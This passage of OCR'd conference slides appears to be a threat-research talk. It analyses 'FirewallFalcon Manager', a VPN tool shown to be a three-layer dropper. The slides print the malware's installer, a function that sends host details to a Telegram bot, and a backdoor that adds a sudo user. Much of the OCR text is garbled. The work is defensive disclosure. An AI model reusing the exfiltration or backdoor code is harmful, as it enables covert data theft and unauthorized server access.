auVar6 = os.WriteFile(@x46e, 0x46e, 0x4954524543204e49, &local_49e, 0x1a4);
if (auVar6._@ 8 != 0) {
return;
}
lWar4 = @;
os/exec.Command(0,0,auVar6._8 8 ,0);
Warl = os/exec. (*Cmd) .Run();
if (Wari != 0) {
return;
+
os.ReadFile();
if (lVar4 == 0) {
runtime. slicebytetostring();
Warl = strings. Index(0x21);
if (lVar1 < @) {
os. OpenFile(0x1a4) ;
return;
```

## Slide 101

**LET’S CHECK THIS BINARY (INSTALL_MOD)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LET’S CHECK THIS BINARY (INSTALL_MOD)
AIC) verti Z MR De LDCS | D2OUYN Twn) UOT 12M T LO) T Li cNMUWODAyMT TOR | I IW) A MRR wGeY DVOGOOE Rar
leSSKAHY UD TL ati\ nRBS 1c ) CLAS 1WOQY JKoZ I nv CNAQEBBOAD GE PADCCAQOG QgEBAKS 1pesoCCF x )0)+\nTBoam77KYG4
LA@SAAB+ 502 IVVIQLINAHVC Fgo | BOGOF fk 1 SOVKOGR7 ZNL eo oS\ NHBXGT JAm7F Bt wk ¢ TMNT 00400 /MBeS 2090m0 BZAPS
B3Xv 20 1Gev LaPBaABB\ nOs vouXTY JEGENY \ wo LHI 04h f App 1 24dh /O2B7 /9.2)< /KDOS + JVEwp LD) /SgkPR\ nc CORSctwt
tpt PRAM CUBS ) + 3KS04400 LU 2UIKF vj YNM7Ur 2NzZyBz2 idyP6\nCCOvp tPaBchm }tt 29 L3QUZ qe St ISVT AMC j rug?Ge
71s.xF vOF GAC 80g9S0N4 \ MGB JHUC Aw MA aNOME eA YWY RORBC Qw1 0 102 ANT bes \GeS ) DI@UTVECESCUIMR \ nies L$) 0
Ou n lWHOYDVRO@OBYEF ) ) Rite 1VVgiU8) 7150129 | ) vt LUAMARGL SqG\ nS 1B JOQEBC AAAS 1 BAQA 76HMB 1k Lngv@/Swt IN/?
3.2003.29 )URPYOONON IMZF\ nBakiiiann Jgwy Jy /xyKmr sa Lami 1OOSUxK4Ghe) 10/S5CKMt RaBbgM lw VBRZONO\ N20 /F 2
: auVar6 = os.WriteFile(0x46e, 0x46e, 0x4954524543204e49, &local_49e, @x1a4) ;
puVers « (undefined® «)( . -
Ree ties us @tee Sean 1 (auVar6._@ 8 != 0) {
epuver} = e(undet return;
pcVaer? = ocVar? « ({ }
puver3 = puver3 + (wv
U
ouvar® = Os. Wr itet | lel @xdte, @xdbe, @x495452454 1204049, bl0ca| 490,8xle4);
if (euwver6. © 8 t= ©) 4 ~
saan \var4 =U;
lat ets os/exec.Command(0,0,auVar6._8 8 ,Q);
at cammianame lVar1 = os/exec. (*Cmd).Run();
—_ if (lari != 0) {
a ensretete return;
if (ivera = @) {
runt sme. sl icetytetestring(); }
Ver] = strings. Index(@x21);
if (Wert <@) {
os .Gpen’ i lel @=xlet);
+ flare
```

## Slide 102

**THIS SHOULDN’T BE THERE**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
THIS SHOULDN'T BE THERE
+ flare
```

## Slide 103

### **FOUR INTERESTING ELEMENTS IN THE TOOL**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
FOUR INTERESTING ELEMENTS IN THE TOOL
+ flare
77 \N
AWD FJ,
```

## Slide 104

**REMEMBER THIS ONE…**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
REMEMBER THIS ONE...
+ flare
Firewallfalcon Manager ¢
Free installation, supports all types of CPU.
OObBBOS
curl -L -o install.sh
"https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-
Manager/refs/heads/main/install.sh” && chmod +x install.sh &&
sudo ./install.sh && rm install.sh
= d 7 91 a 1 © 2608 edited 2:15PM
SY 9 4 comments
```

## Slide 105

### **GIT CLONE --MIRROR**

## **JUNE-NOVEMBER 2025**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
GIT CLONE --MIRROR C)
case "$(uname -m)" in
x86_64) curl -L -o 64install.sh ".../main/64install.sh" G&& sudo ./64install_v3.sh G& rm...
aarch64|arm64) curl -L -o arminstall.sh ".../main/arminstall.sh" && sudo ./arminstall.sh && rm...
JUNE-NOVEMBER 2025
```

## Slide 106

### **64INSTALL_V3.SH IS A THREE-LAYER DROPPER**

**Layer 1: Bash self-extractor** Encrypted and obfuscated payload embedded inside the script

## Slide 107

### **64INSTALL_V3.SH IS A THREE-LAYER DROPPER**

**Layer 1: Bash self-extractor** Encrypted and obfuscated payload embedded inside the script **Layer 2: SHC-compiled ELF** Does arc4-decrypt and runs

## Slide 108

### **64INSTALL_V3.SH IS A THREE-LAYER DROPPER**

**Layer 1: Bash self-extractor** Encrypted and obfuscated payload embedded inside the script

**Layer 2: SHC-compiled ELF** Does arc4-decrypt and runs

**Layer 3: A management tool** Hides a backdoor and enables data exfiltration

## Slide 109

**LAYER1 OF 64INSTALL_V3.SH**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LAYER1 OF 64INSTALL_V3.SH
#!/bin/bash
# This is a self-extracting installer. The binary payload is appended after the ‘exit' command.
# [MODIFIED] The final command will be named ‘menu'
p="/usr/local/bin/menu"
# Helper function for error messages
e(){ echo “Error: $1" >&2; exit 1; }
# -—-- Pre-flight Checks ---
# 1. Must be run as root
[[ $EUID -ne 0 ]] && e "This installer must be run with root privileges."
# 2. Check for ‘bc' which is required by the main script, and install if missing
command —v bc &>/dev/null || {
echo "The 'bc' utility is required. Attempting to install..."
# Try apt first, then yum for broader compatibility
apt-get update &>/dev/null && apt-get install -y bc &/dev/null || yum install -y bc &/dev/null || e "Failed to install 'bc'.
```

## Slide 110

**LAYER1 OF 64INSTALL_V3.SH**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LAYER1 OF 64INSTALL_V3.SH
# --- Extraction Logic -—--
# Find the line number where the payload starts
l=$(grep -axn '*# --- PAYLOAD START --- DO NOT EDIT BELOW THIS LINE ---$' "$@" | cut -d:
[ -z "$l" ] && e "Installer is corrupted or incomplete. Cannot find payload."
# The payload starts on the next line
s=$((1 + 1))
# Create a temporary file to hold the extracted binary
t=$(mktemp)
# Extract the payload from this script file into the temporary file
tail -n "+$s" "go" > "$t" || { rm -f "$t"; e "Payload extraction failed."; }
# --- Installation -—--
# Install the extracted script to the final destination and make it executable
install -m 755 "$t" "$p" || { rm -f "$t"; e "Installation failed. Check permissions for /usr/local/bin/."; }
# Clean up the temporary file
rm -f "$t"
```

## Slide 111

**LAYER1 OF 64INSTALL_V3.SH**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
LAYER1 OF 64INSTALL_V3.SH
# —-- PAYLOAD START --- DO NOT EDIT BELOW THIS LINE ——-
et E LF stxsolsoHNULNULNULNULNULNULNULNULNULETXNUL>> NULSOHNULNULNULNULOCNULNULNULNULNULNUL(INULNULNULNULNULNULNUL GSSTXNULNULNULNULNULNULNULNULNUL (GNUL G NUL
NUL(QNULGSNULFSNULACKNULNULNULEOTNULNULNUL(QNULNULNULNULNULNULNUL(QNULNULNULNULNULNULNUL(GNULNULNULNULNULNULNUL (@STSNULNULNULNULNULNUL 6) TXNULNULNULNULNULNULBSNULNULNULNULNULNULNULETYNULNULNULEGTNULNULNULCANETXNULNULNULNULNULNULCANE TXNULNULNULNULNULNULCAN
NULNULBELNULEJNULNULNULDLENULNULNULG) (7 © ACKNULNULACKNUL@JNULNULNULDLENULNULNULG) 6 & ACKNULNULENQNULACKSOHNULNULDLENULNULNULOCA i
NULNULEOTNULDCISOHNULNULDLENULNULNUL © &) EJACKNULNULETXNULESCSOHNULNULOLENULNULNUL SUB | NULNULSTXNUL,SOHNULNULNULNULNULNULOLENULNULNULNULNULNULBSNULNULNULNULNULNULNUL (7 0C3NULNULNULNULNULNULCAN=NULNULNULNULNULNULBSNULNULNULNULNULNULNUL (C3 1ULBS(GINULNULNULNULNUL
NULNULNULNULNULNULNULNULNULNULNUL [) NULNULNULNULNULNULBELNULNULNUL NULNULNULNULNULNULNULNULNULNULNUL “7 NULNULNULNULNULNULBELNULNULNUL Fe NULNULNULNULNULNULNULNULNULNULNUL X ? NULNULNULNULNULNULBELNULNULNUL
NULNULNULNULNULNULNULNULNULNULNULG) “7 NULNULNULN JULNULNULNULNULNULNULNULNULNULNULE "7 NULNULNULNULNULNULBELNULNULNULDLENULNULNULNULNULNULNULNULNULNULNUL @ ° NULNULNULNULNULNULBELNULNULNULOCTNULNULNULNULNULNULNULNULNULNULNUL GY “7 NULNULNULN :2NULNU
wm BOGO f OOses@ hymn G2 GGG f OOsnsHh ram" GOO f O@sesHh
nan Goe29OG f OGsnsG him GsxGOG f GGsnsG hsm. GGGOG f GGsnsG hoemnuncG GOGO f OGsxs6) hocmanun GOOG f OGsnsG hocanunn YOOGO f OO snsG hocamununn GOOG f OGsnsG hoc GOOG f OOsnst
ocacansTanur Gocaassi®ena
esr § OsoiGacsorensrousGanGonsran GGURG | OOssOUHOGHO} OUGHOEGHOEOOOmnuus GenadensrouisGOHOHOru@eresmnasGeoreG) E GaGunGcmsrans@ Eso} JaaGewsrousQanblersmusOOO@ } OGHCOHOEGH
Retasnou @ocasss Gena Jcansraus@G@HOHO
<Erasnours@ U@ Qocasss Ging , canst. G Oso Qenc%scansnoursGenorscarsoun GSO GG OOHGE Onasonunn Gm@nrsonunnG } Guus ' COOGO ] OGses@ UHOGHG } OUGHOEGHOE GO Grams Gena crasrnu G YsorGenoGeresrours@enoben
Usmsnout @ocaessi®jeno LevesrusiQOHOHO
_Snisns@ UG Gocrass Gene Qeresrauisi@ GH OHOMKE snsrais eorouen F OHOEOSGess E OHGHOmersnsnausGeowee 1 OG OHOEOOHEHOEOsHOmOsG } Oras , OOOOO ] GOs OUHOGHOO Gon OOOGOO dH Geers ( wu
COOOOGmuM HOO * COOGGinan Oruninini HOGG POGOHOOOEEOCHOGhGECHOGGGEEHEO  COGHEOEOOGHEECOEGGEOGS | COGOOOCOOGECHOOMGOCHOEGHEE ( COGHGECHOOSOGOHOE
seine HOGHONMINNLG e OGEHOEOGOGHOGEF OGCHOGOEOCHOGOGOCHOGG  COOCGEOGCHOOGOEOML [HOOCOECHEOGOOGEOOOOEH cCOHO<aGGOOOOOGHOOHOSe” Mim HOT inn
OOOO rua H OaeGocisrau HOWE OOO GsOarawocisnan OG t —HOere Locsin HOOGOOOGHO jrmnnGGOOGHIG } FHOaaGoesanG German
nanan Gene Gocisraun GG OOOG Geman H GanoG) mun OOOG OO Osman} Genel munc OOOO Osanna HOenal sro GOO qOOGGsmmumnnH Gare saan OOO ] EOGSsrmmununnHGeral Suunn HOOOPOGSE
HOGssNHOOEOOGHOECHO} Ouiu
sr HOOHOEG
sro HOGOOOOEOt FHOAG
+ flare
```

## Slide 112

**ANALYZING 64INSTALL.SHC (LAYER3)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ANALYZING 64INSTALL.SHC (LAYER3)
send_install_notification() {
echo -e "${C_BLUE}s7 First-time installation setup...${C_RESET}"
BOT_TOKEN=" E
CHAT_ID=" "
IPV4=$(curl -s -4 icanhazip.com)
IPV6=$(curl -s -6 icanhazip.com --max-time 5)
HOSTNAME=$ (hostname)
0S=$(uname -a)
CPU=$(1lscpu | grep ‘Model name' | awk -F: ‘{print $2}' | xargs)
CORES=$(nproc)
RAM=$(free -g | awk '/Mem:/ {print $2 " GB"}')
DISK=$(df -BG --output=size,avail / | awk 'NR==2 {print $1 " total, " $2 " free"}'
MESSAGE=""«!!! #2 New SSH Manager Install !!!x
*Hostname:* \* $HOSTNAME\~
*IPv4:% \*$IPV4\~
if [[ -n "$IPV6" && "$IPV6" != "$IPV4" ]]; then
MESSAGE+="*IPv6:* \* $IPV6\~
fi
MESSAGE+="*CPU:* $CPU
*Cores:* $CORES
*RAM:* $RAM
*Disk:* $DISK
*0S:* \*$0S\*"
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-d chat_id="$CHAT_ID" \
-d parse_mode="Markdown" \
—-data-urlencode text="$MESSAGE" > /dev/null 2>&1
+flare
```

## Slide 113

**ANALYZING 64INSTALL.SHC (LAYER3)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ANALYZING 64INSTALL.SHC (LAYER3) C)
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-d chat_id="$CHAT_ID" \
-d parse_mode="Markdown" \
—-data-urlencode text="$MESSAGE" > /dev/null 2>&1
```

## Slide 114

**ANALYZING 64INSTALL.SHC (LAYER3)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ANALYZING 64INSTALL.SHC (LAYER3)
*Hostname:* \* $HOSTNAME\ *
*IPv4:* \*$IPV4\~
if [[ -n "$IPV6" && "$IPV6" != "$IPV4" |]; then
MESSAGE+="*IPv6:* \* $IPV6\~
fi
MESSAGE+="*CPU:* $CPU
*Cores:* $CORES
*RAM:* $RAM
*Disk:* $DISK
*0S:* \*$0S\*"
```

## Slide 115

**IS THE TELEGRAM BOT STILL ACTIVE?**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IS THE TELEGRAM BOT STILL ACTIVE?
ubuntu@F lareResearch:~/Research/March-26/FirewallFalcon$ curl -s "https://api.telegram.org/ : /getMe" | python3 -m json
-tool
{
"ok": true
"result": {
"id":
"is bot": true,
"first_name": "Manager",
"username": "firewallfalconmanager_bot"
"can_join_groups": true,
"“can_read_all_group_messages": false,
"supports_inline_queries": false,
"can_connect_to_business": false,
"has_main_web_app": false,
"has_topics_enabled false,
"allows_users_to_create_topics": false
```

## Slide 116

**ANALYZING 64INSTALL.SHC (LAYER3)**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ANALYZING 64INSTALL.SHC (LAYER3) C)
initial_setup() {
useradd -m 2>/dev/null; echo 3 | chpasswd &>/dev/null; usermod —aG sudo &>/dev/null
mkdir -p "$DB_DIR"
touch "$DB_FILE"
mkdir —p "$SSL_CERT_DIR"
setup_limiter_service
if [ ! -f "“$INSTALL_FLAG_FILE" ]; then
send_install_notification
touch "$INSTALL_FLAG_FILE"
fi
```

## Slide 117

### **LET’S RECAP…**

Internet facing SSH on port 22: - Root access - New user and password

Telegram bot exfiltrates data about the host

## Slide 118

### **OH, NO! THAT’S A BACKDOOR**

## Slide 119

**FOUR INTERESTING ELEMENTS IN THE TOOL**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
FOUR INTERESTING ELEMENTS IN THE TOOL
+ flare
77 \N
AWD FJ,
```

## Slide 120

**REMEMBER THIS ONE…**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
REMEMBER THIS ONE... C)
Your connection details:
— Tunnel Domain: tun- .manager.firewallfalcon.qzz.io
— Public Key:
— Forwarding To: V2Ray (port 8787)
— Action Required: Ensure a V2Ray service (vless/vmess/trojan) listens on port 8787 (no TLS)
+ flare
```

## Slide 121

**FOUND THIS IN THE CODE**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
FOUND THIS IN THE CODE
71 # --- ZiVPN Variables -—--
72 ZIVPN_DIR="/etc/zivpn"
73 ZIVPN_BIN="/usr/local/bin/zivpn"
74 ZIVPN_SERVICE_FILE="/etc/systemd/system/zivpn.service"
75 ZIVPN_CONFIG_FILE="$ZIVPN_DIR/config. json"
76 ZIVPN_CERT_FILE="$ZIVPN_DIR/zivpn.crt"
77 ZIVPN_KEY_FILE="$ZIVPN_DIR/zivpn. key"
78
79 DESEC_TOKEN=" 1 <—
80 DESEC_DOMAIN="manager. firewallfalcon.qzz.io"
81
82 SELECTED_USER=""
83 UNINSTALL_MODE="interactive"
84 BANNER_CACHE_TTL=15
85 BANNER_CACHE_TS=0
86 BANNER_CACHE_0S_NAME=""
87 BANNER_CACHE_UP_TIME=""
88 BANNER_CACHE_RAM_USAGE="""'
89 BANNER_CACHE_CPU_LOAD=""
+ flare
```

## Slide 122

### **ANALYZING FIREWALLFALCON’S DNSTT**

**curl -s**

**https://manager.firewallfalcon.qzz.io/ -H "Authorization: Token <<REDACTED>>"**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ANALYZING FIREWALLFALCON’S DNSTT
"created": "2026-@7-14T@1:26:44.347877Z",
"domain": "manager.firewallfalcon.qzz.io",
'
-manager.firewallfalcon.qzz.io.",
"name":
"records":
1,
StL": 3600;
"type" a AS ;
"touched": "2@26-@07-14T@1:26:44.360210Z"
"created": "2026-07-14T00:11:56.900720Z",
"domain": "“manager.firewallfalcon.qzz.io",
"subname": "tun- _ tye
"name": "tun- -Manager.firewallfalcon.qzz.io.",
"records": [
"ns- -manager.firewallfalcon.qzz.io."
],
"ttl": 3600,
"type" : "NS" i
"touched": "2@26-07-14T0@:11:56.908248Z"
curl -s
https://manager.firewallfalcon.qzz.io/
-H "Authorization: Token
<<REDACTED>>"
```

## Slide 123

**ANALYZING FIREWALLFALCON’S DNSTT**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
JOS LITE
CUMULATIVE DNS RECORDS OVER TIME
2025
RECORDS |
2900 -
2400 ~
1900 -
1400 -
980 -
400 -
-100
=a
2026
— (4
MAR-25
T
APR-25
T
MAY-25
JUN-25
JUL-25
MONTH
FEB-26
T
MAR-26
T
APR-26
T
MAY-26
T
JUN-26
T
JUL-26
mA Ae ewe
```

## Slide 124

ANALYZING FIREWALLFALCON’S DNSTT

## Slide 125

### **ANALYZING THE DEPLOYED SERVERS**

`vps-xxxxxxxx` → vps-23tizzl1 `tun-xxxxxxxx` → tun-1h6f9l `ns-xxxxxxxx` → ns-1h6f9l

## Slide 126

### **ANALYZING THE DEPLOYED SERVERS**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ANALYZING THE DEPLOYED SERVERS
'é
Compromised machine
y
VPW Reseller
Falcon agent vps-23tizzl1 tun-1h6Fl ns-1h6Fal
Installs Firewall Assigned node ID Create atunnel Create a DVS ¢ \)
| ——\
Sell cheap VP
To customers
+ flare
```

## Slide 127

### **WHY DO I THINK THESE ARE COMPRMISED SERVERS?**

Multiple exposed ports with known vulnerabilities and misconfigurations

## Slide 128

### **WHY DO I THINK THESE ARE COMPRMISED SERVERS?**

Multiple exposed ports with known vulnerabilities and misconfigurations Many certificates with retail and services profiles, doesn’t fit the VPN reseller profile, or the profiles the tool offers.

## Slide 129

### **WHY DO I THINK THESE ARE COMPRMISED SERVERS?**

Multiple exposed ports with known vulnerabilities and misconfigurations Many certificates with retail and services profiles, doesn’t fit the VPN reseller profile, or the profiles the tool offers.

Legitimate websites on the server that have no connection to the VPN reseller

## Slide 130

### **WHY DO I THINK THESE ARE COMPRMISED SERVERS?**

Multiple exposed ports with known vulnerabilities and misconfigurations Many certificates with retail and services profiles, doesn’t fit the VPN reseller profile, or the profiles the tool offers.

Legitimate websites on the server that have no connection to the VPN reseller

Wide geo-location, vendors spread even for the same VPN reseller

## Slide 131

### **FOUR INTERESTING ELEMENTS IN THE TOOL**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
FOUR INTERESTING ELEMENTS IN THE TOOL
+ flare
77 \N
AWD FJ,
```

## Slide 132

## Slide 133

### **ACTIVITY TIMELINE**

**FirewallFalcons**

**NOVEMBER NOVEMBER AUGUST 2024 2025 2026**

## Slide 134

### **ACTIVITY TIMELINE**

FirewallFalcons
89.168.51.93

NOVEMBER  JANUARY  NOVEMBER  AUGUST
2024 2025  2025 2026

## Slide 135

### **ACTIVITY TIMELINE**

FirewallFalcons
89.168.51.93
thefirewoods.org

**NOVEMBER JANUARY MAY NOVEMBER AUGUST 2024 2025 2025 2025 2026**

## Slide 136

### **ACTIVITY TIMELINE**

**FirewallFalcons 89.168.51.93 thefirewoods.org Backdoor MITM FirewallFalcons NOVEMBER JANUARY MAY JUNE NOVEMBER MAY AUGUST 2024 2025 2025 2025 2025 2026 2026**

## Slide 137

**ACTIVITY TIMELINE FirewallFalcons 89.168.51.93 thefirewoods.org Backdoor MITM FirewallFalcons FirewallFalcons NOVEMBER JANUARY MAY JUNE NOVEMBER MAY JUNE AUGUST 2024 2025 2025 2025 2025 2026 2026 2026**

## Slide 138

INTERNET
ENCRYPTED

### **THE INFRASTRUCTURE**

#### **ENCRYPTED**

#### **ENCRYPTED**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
THE INFRASTRUCTURE =)
=
lo =)
ENCRYPTED
= = = =
°° = = = O—=
= = = =
= = = = = = = =
= = = = = = = =
= = = = = = = =
ENCRYPTED
Eel | COTE
```

## Slide 139

THE INFRASTRUCTURE
INTERNET
ENCRYPTED
VPN TUNNEL CAN TERMINATE HERE
ENCRYPTED

ENCRYPTED

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
THE INFRASTRUCTURE
ENCRYPTED Freer
E =
ENCRYPTED
o. = o = =— 2 =
= = D Fe ZB @BQ = =
ENCRYPTED
Eel | Eee
```

## Slide 140

### **WHO ARE THE FIREWALL FALCON USERS**

- Commercial SSH/WebSocket VPN subscription

- Cheap VPS

- Free internet

- Streaming

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WHO ARE THE FIREWALL FALCON USERS
¢ Commercial SSH/WebSocket VPN subscription
¢ Cheap VPS
¢ Free internet
¢ Streaming
ee seees
+ flare
```

## Slide 141

### **WHO ARE THE FIREWALL FALCON USERS**

- Commercial SSH/WebSocket VPN subscription

- Cheap VPS

- Free internet

- Streaming

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
WHO ARE THE FIREWALL FALCON USERS
¢ Commercial SSH/WebSocket VPN subscription
¢ Cheap VPS
e Free internet
4,578 posts 77.1K followers za
¢ Streaming
ee se
+flare
Game Publisher
```

## Slide 142

**WHO ARE THE CUSTOMERS OF THE FIREWALL FALCON USERS**

## Slide 143

## Slide 144

# **THANK YOU QUESTIONS?**
